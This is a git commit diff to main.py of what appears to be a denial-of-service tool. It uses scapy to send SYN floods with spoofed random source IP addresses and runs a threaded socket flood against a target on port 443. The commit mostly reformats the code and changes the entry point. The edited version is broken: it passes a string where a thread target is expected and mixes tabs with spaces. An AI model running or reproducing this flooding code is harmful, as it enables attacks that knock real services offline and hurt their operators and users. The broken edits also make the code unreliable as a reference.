01fa1df3d94c569dd36151571105c82ffda1c204
1-off <97915378+1-off@users.noreply.github.com>
2022-03-02 13:01:31 +0100

    Update main.py

--- main.py
+++ main.py
@@ -3,20 +3,19 @@ import threading
 from random import randint
 from scapy.all import *
 
-
-def find_ip(hostname: str) -> str:
+def find_ip(hostname:str) ->str:
     hostname = socket.gethostname()
     ip = socket.gethostbyname(hostname)
     return ip
 
 
 def randomIP():
-    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-    return ip
-
+	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
+	return ip
 
 def randomPort():
-    return randint(1000, 9000)
+	return randint(1000, 9000)
+
 
 
 target_ip = ''
@@ -25,12 +24,10 @@ fake_ip = '217.107.219.57'
 port = 443
 # check before how many cores you have and use about 25% of max thread available
 max_threads = 1
-raw = Raw(b"X" * 1024)
+raw = Raw(b"X"*1024)
 
-# this is a counter
+#this is a counter 
 attack_num = 0
-
-
 def standard_attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -44,33 +41,30 @@ def standard_attack():
 
         s.close()
 
-
 def syn_attack():
-    total = 0
-
-    while True:
+	total = 0
+    
+	while True:
         # forge IP packet with target ip as the destination IP address
-        IP_Packet = IP()
-        IP_Packet.src = randomIP()
-        IP_Packet.dst = target_ip
+		IP_Packet = IP()
+		IP_Packet.src = randomIP()
+		IP_Packet.dst = target_ip
 
-        # Let's forge our TCP layer:
-        TCP_Packet = TCP()
-        TCP_Packet.sport = randomPort()
-        TCP_Packet.dport = port
-        TCP_Packet.flags = "S"
-        TCP_Packet.seq = randomPort()
-        TCP_Packet.window = randomPort()
+        #Let's forge our TCP layer:
+		TCP_Packet = TCP()
+		TCP_Packet.sport = randomPort()
+		TCP_Packet.dport = port
+		TCP_Packet.flags = "S"
+		TCP_Packet.seq = randomPort()
+		TCP_Packet.window = randomPort()
 
-        send(IP_Packet / TCP_Packet / raw, verbose=0)
-        total += 1
-        print(f"{total} bayraktar")
+		send(IP_Packet/TCP_Packet/raw, verbose=0)
+		total+=1
 
 def initiate(attack_type):
     for i in range(max_threads):
         thread = threading.Thread(target=attack_type)
         thread.start()
-
-
+        
 if __name__ == "__main__":
-    syn_attack()
+    initiate('syn_attack')
